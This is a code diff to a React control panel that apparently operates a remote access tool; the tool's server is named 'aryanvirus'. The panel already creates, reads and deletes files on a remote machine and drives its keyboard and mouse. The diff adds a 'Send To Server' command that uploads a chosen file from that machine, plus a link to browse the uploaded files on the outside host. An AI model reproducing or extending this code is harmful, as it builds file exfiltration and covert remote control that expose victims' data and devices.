@@ -163,6 +163,7 @@ export default function App() {
         <button style={{ backgroundColor: "#2fc853ff" }} onClick={() => sendCommand(`createfile ${inputValue}`, true)}>Create File</button>
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`readfile ${inputValue}`, true)}>Read File</button>
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`deletefile ${inputValue}`, true)}>Delete File</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`sendtoserver ${inputValue}`, true)}>Send To Server</button>
         <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => sendCommand("end", false)}>End Script</button>
       </div>
 
@@ -198,6 +199,7 @@ export default function App() {
         <button style={{ backgroundColor: "#8e44ad" }} onClick={() => window.open("https://aryanvirus.onrender.com/listuploads")}>List Uploads</button>
         <button style={{ backgroundColor: "#f1c40f" }} onClick={() => window.open("https://aryanvirus.onrender.com/latestupload")}>Latest Upload</button>
         <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads")}>All Uploads</button>
+        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads_new")}>All File Uploads</button>
       </div>
 </div>:panel==1?<div><Keyboard sendCommand={sendCommand}/>
 <MouseTouchpad sendCommand={sendCommand}/></div>:null}
